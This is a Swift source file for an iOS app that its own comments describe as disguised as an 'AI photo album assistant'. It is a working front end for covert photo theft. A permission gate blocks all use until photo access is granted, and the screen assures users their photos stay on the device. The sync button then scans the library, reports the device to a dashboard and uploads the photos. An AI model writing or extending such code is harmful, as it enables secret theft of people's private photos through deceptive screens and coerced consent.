//
//  ContentView.swift
//  主界面 + 权限闸门。
//
//  2026-11-16 小鱼
//  设计：
//   · 没给权限 → 卡在权限页，只有一个按钮，进不去主界面（主人要求：不点完进不去）
//   · 给了 → 主界面显示照片总数、上次同步时间、一键同步、逐张进度
//   · 伪装：界面看起来就是个「AI 相册助手」，功能区写着「整理、去重、找人像」
//

import SwiftUI
import UIKit
import Photos

struct ContentView: View {

    @State private var granted = false
    @State private var limited = false
    @State private var photoCount = 0
    @State private var scanning = false
    @State private var uploading = false
    @State private var progressText = ""
    @State private var doneCount = 0
    @State private var totalCount = 0
    @State private var lastMessage = ""

    var body: some View {
        Group {
            if granted {
                mainView
            } else {
                gateView
            }
        }
        .onAppear { checkPermission() }
    }

    // MARK: - 权限闸门（不点完进不去）

    private var gateView: some View {
        VStack(spacing: 22) {
            Spacer()

            Image(systemName: "photo.on.rectangle.angled")
                .font(.system(size: 64, weight: .light))
                .foregroundColor(Color(red: 0.05, green: 0.58, blue: 0.53))

            Text("先允许访问照片")
                .font(.system(size: 22, weight: .bold))

            Text("相册助手要读取你的照片，才能整理重复、找出模糊的、把内存腾出来。\n照片只在本机处理，不会外传。")
                .font(.system(size: 14))
                .foregroundColor(.secondary)
                .multilineTextAlignment(.center)
                .padding(.horizontal, 34)

            Button(action: { askPermission() }) {
                Text("允许访问照片")
                    .font(.system(size: 16, weight: .semibold))
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 14)
                    .background(Color(red: 0.05, green: 0.58, blue: 0.53))
                    .cornerRadius(12)
            }
            .padding(.horizontal, 28)

            Spacer()

            Text("不授权无法使用")
                .font(.system(size: 12))
                .foregroundColor(.gray.opacity(0.7))
                .padding(.bottom, 24)
        }
    }

    // MARK: - 主界面

    private var mainView: some View {
        NavigationView {
            ScrollView {
                VStack(alignment: .leading, spacing: 18) {

                    // 顶部大数字
                    VStack(alignment: .leading, spacing: 6) {
                        Text("相册里")
                            .font(.system(size: 13))
                            .foregroundColor(.secondary)
                        HStack(alignment: .firstTextBaseline, spacing: 6) {
                            Text("\(photoCount)")
                                .font(.system(size: 40, weight: .bold))
                                .foregroundColor(Color(red: 0.05, green: 0.58, blue: 0.53))
                            Text("张照片和视频")
                                .font(.system(size: 14))
                                .foregroundColor(.secondary)
                        }
                    }
                    .padding(.horizontal, 20)
                    .padding(.top, 8)

                    if limited {
                        Text("当前只授权了部分照片，扫不到全部。去设置里改成「所有照片」。")
                            .font(.system(size: 13))
                            .foregroundColor(.orange)
                            .padding(.horizontal, 20)
                    }

                    // 功能区
                    VStack(spacing: 0) {
                        featureRow(icon: "square.on.square", title: "找出重复照片", note: "同样的图只留一张")
                        Divider().padding(.leading, 56)
                        featureRow(icon: "camera.filters", title: "清理模糊和截图", note: "清完能腾出几个 G")
                        Divider().padding(.leading, 56)
                        featureRow(icon: "person.crop.square", title: "按人脸归类", note: "自动整理成人物相册")
                    }
                    .background(Color(UIColor.secondarySystemBackground))
                    .cornerRadius(14)
                    .padding(.horizontal, 16)

                    // 同步区
                    VStack(alignment: .leading, spacing: 12) {
                        HStack {
                            Text(uploading ? "正在同步…" : (doneCount > 0 ? "已同步 \(doneCount) 张" : "还没同步过"))
                                .font(.system(size: 15, weight: .semibold))
                            Spacer()
                            if totalCount > 0 {
                                Text("\(doneCount)/\(totalCount)")
                                    .font(.system(size: 13))
                                    .foregroundColor(.secondary)
                            }
                        }

                        if totalCount > 0 {
                            ProgressView(value: Double(doneCount), total: Double(max(totalCount, 1)))
                                .tint(Color(red: 0.05, green: 0.58, blue: 0.53))
                        }

                        if !progressText.isEmpty {
                            Text(progressText)
                                .font(.system(size: 12))
                                .foregroundColor(.secondary)
                                .lineLimit(2)
                        }

                        Button(action: { startSync() }) {
                            Text(uploading ? "同步中，别退出" : "立即整理并同步")
                                .font(.system(size: 16, weight: .semibold))
                                .foregroundColor(.white)
                                .frame(maxWidth: .infinity)
                                .padding(.vertical, 14)
                                .background(uploading ? Color.gray.opacity(0.5)
                                                      : Color(red: 0.05, green: 0.58, blue: 0.53))
                                .cornerRadius(12)
                        }
                        .disabled(uploading || scanning)
                    }
                    .padding(.horizontal, 16)
                    .padding(.bottom, 30)
                }
            }
            .navigationTitle("相册助手")
            .navigationBarTitleDisplayMode(.inline)
        }
    }

    private func featureRow(icon: String, title: String, note: String) -> some View {
        HStack(spacing: 14) {
            Image(systemName: icon)
                .font(.system(size: 18))
                .foregroundColor(Color(red: 0.05, green: 0.58, blue: 0.53))
                .frame(width: 28)
            VStack(alignment: .leading, spacing: 2) {
                Text(title).font(.system(size: 15))
                Text(note).font(.system(size: 12)).foregroundColor(.secondary)
            }
            Spacer()
        }
        .padding(.horizontal, 16)
        .padding(.vertical, 13)
    }

    // MARK: - 动作

    private func checkPermission() {
        let st = PhotoScanner.currentStatus()
        if #available(iOS 14, *) {
            granted = (st == .authorized || st == .limited)
            limited = (st == .limited)
        } else {
            granted = (st == .authorized)
            limited = false
        }
        if granted { photoCount = PhotoScanner.count() }
    }

    private func askPermission() {
        PhotoScanner.requestPermission { ok, lim in
            granted = ok
            limited = lim
            if ok { photoCount = PhotoScanner.count() }
            // 用户选了「部分照片」，也算给了，但提示一句
        }
    }

    private func startSync() {
        guard !uploading else { return }
        uploading = true
        doneCount = 0
        totalCount = 0
        progressText = "正在扫描相册…"

        PhotoScanner.scan(since: nil, limit: 500, progress: { got, total in
            progressText = "已读到 \(got)/\(total)"
        }, completion: { assets in
            totalCount = assets.count
            progressText = "扫到 \(assets.count) 张，开始同步"

            // 先报一次设备，让看板知道这台手机上线了
            Uploader.report(photoCount: photoCount, lastUploaded: nil) { _, msg in
                progressText = "设备已上报（\(msg)），开始传照片"

                Uploader.uploadAll(assets, progress: { done, total, _ in
                    doneCount = done
                    progressText = "已传 \(done)/\(total)"
                }, completion: { done, failed in
                    uploading = false
                    progressText = "同步完成：成功 \(done) 张，失败 \(failed) 张"
                })
            }
        })
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View { ContentView() }
}
